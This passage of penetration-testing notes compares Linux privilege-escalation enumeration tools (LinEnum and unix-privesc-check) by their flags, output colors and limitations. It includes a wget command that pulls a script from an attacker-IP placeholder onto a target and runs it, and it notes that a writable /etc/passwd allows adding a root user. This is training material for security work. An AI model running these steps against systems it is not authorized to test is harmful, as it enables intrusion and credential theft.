### Key Features

- **Color-coded output** — vulnerable items in red, normal in blue, critical findings stand out
- **Keyword search** (`-k password`) — searches for strings across files during the scan
- **Report export** (`-r report.txt -e /tmp/`) — save findings to a file
- **Thorough mode** (`-t`) — longer but more comprehensive

### Export Behavior

```bash
./LinEnum.sh -e /tmp -r sample_privesc_check_report.txt
```

> [!warning] LinEnum's export feature creates **directory clones** inside `/tmp` of all discovered files (copying `/etc/shadow`, `.bash_history`, etc.) rather than generating a single clean text report. This can **pollute the target filesystem**.

### Color Legend

| Color | Meaning |
|---|---|
| **Red/Yellow background** | 99% a PE vector — sure-shot escalation path |
| **Red text** | Must investigate — highly interesting finding |
| **Light Cyan** | Users with console |
| **Blue** | Users without console & mounted devices |
| **Green** | Common things (users, groups, SUID/SGID, mounts, scripts, cron) |
| **Light Magenta** | Your username |

### Key Advantages Over Other Tools

- **Documentation links** — every section includes direct links to `book.hacktricks.xyz` for detailed exploitation guidance
- **Targeted module execution** — `-o UsrI` to run only user checks, stack multiple modules
- **Actively maintained** on GitHub
- **Clean, intuitive color-coded output**
- **Network discovery** built in (`-d` and `-p` flags)

## Tool 3: unix-privesc-check

Downloaded separately and run on target:

```bash
wget http://<ATTACKER_IP>/unix-privesc-check -O upc.sh
chmod +x upc.sh
./upc.sh standard    # Speed-optimized
./upc.sh detailed    # Deeper checks (more false positives)
```

### Two Modes

| Mode | Description |
|---|---|
| **Standard** | Speed-optimized, checks core security settings |
| **Detailed** | Deeper — checks open file permissions extensively, but slower with more false positives |

### Key Findings

- **World-writable `/etc/passwd`** — can add a root-level user entry (UID 0)
- **World-writable `/etc/shadow`** — can modify password hashes directly
- Flagged non-default cron job entries
- Checks SUID binaries, SSH keys, startup scripts, writable PIDs

### Limitations

- **Output is not intuitive** — plain text warnings without color coding
- No category separators, symbols, or line breaks between findings
- No module-by-module execution — only Standard and Detailed modes
- No summary report — forces you to inspect every line
- **Recommendation:** Always redirect output to a file for analysis:

```bash
./upc.sh standard > upc_output.txt 2>&1
```

> 4. Use a **hybrid model** — run automated scans in background while doing manual enum
